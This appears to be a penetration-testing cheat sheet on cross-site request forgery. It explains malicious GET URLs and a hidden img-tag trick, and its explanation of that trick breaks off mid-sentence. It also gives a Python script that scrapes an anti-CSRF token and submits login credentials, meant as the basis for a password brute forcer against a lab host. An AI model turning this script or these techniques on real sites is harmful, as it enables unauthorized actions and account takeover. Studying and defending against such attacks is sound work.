# Cross Site Request Forgery

Cross site Request Forgery \(CSRF\) attacks forces the user to perform action the he did not intend to perform. This usually  possible by creating a malicious URL-address that the victim executes in his browser, while he is logged in.

## What's the worst that can happen?

The attacker can make actions for the user. For example change the email-address, make a purchase, or something like that. So it could be used to change the adress, and reset the password by sending an email.

## How to perform it?

1. Investigate how the website works  
   First you need to know how the application works. What the endpoints are.

2. Construct your malicious URL  
   Now you just construct the URL. Either using get or post.

3. `GET`  
   If you use only `GET` you can construct the URL like this:

[http://example.com/api/createUser?name=Jose](http://example.com/api/createUser?name=Jose)

* `POST`

If the requests are sent as `POST` you need to make the victim run a link that where you control the server. So that you can add the arguments in the body.

There is one creative trick for this. It is to use the image-tag. Because the image-tag can be used to automatically retrieve information from other sites. If you have an image on your site but it is referenced to

`<img style="display: none" src="http://example.com/image.jpg">`

## CSRF Bypass for Brute Force Example

Useful for setting up a potential username/password brute forcer

```
#!/usr/bin/python3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

re_csrf = 'csrfMacgicToken = "(.*?)"'
# this grabs the contents of the csrfMacgicToken variable and uses regular expressions
# to get the contents of the value which this case is in double quotes. In this case csrfMacgicToken = "sid:1234"
# Note: this is case dependent make sure to change variable name or regular expressions based on the source page
# in this case the source page was of index.php 

s = requests.session()
#this make sure future request uses cookies without manually adding them

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# This ignores the InsecureRequestWarning: Unverified HTTPS request is being made 

r = s.post('https://10.10.10.X/index.php', verify=False)
# verify=false ignores SSL validation

csrf = re.findall(re_csrf, r.text)[0]
login = {'__csrf_magic': csrf, 'usernamefld': 'd00mfist', 'passwordfld': 'dummy1234', 'login': 'Login' }
# Note the __csrf_magic variable was grabbed from a burp post request as well ad the variables usernamefld and 
# passwordfld
# This was the data field of post request: __csrf_magic=sid1234&usernamefld=test&passwordfld=test&login=Login

r = s.post('https://10.10.10.X/index.php', data=login)
print(r.status_code)
print(csrf)

```

## Protection

The only real solution is to use unique tokens for each request.

### References

[http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html](http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html)

[https://www.owasp.org/index.php/Testing\_for\_CSRF\_\(OTG-SESS-005](https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005)\)

[https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_\(CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF)\)

ippsec \(Sense\)

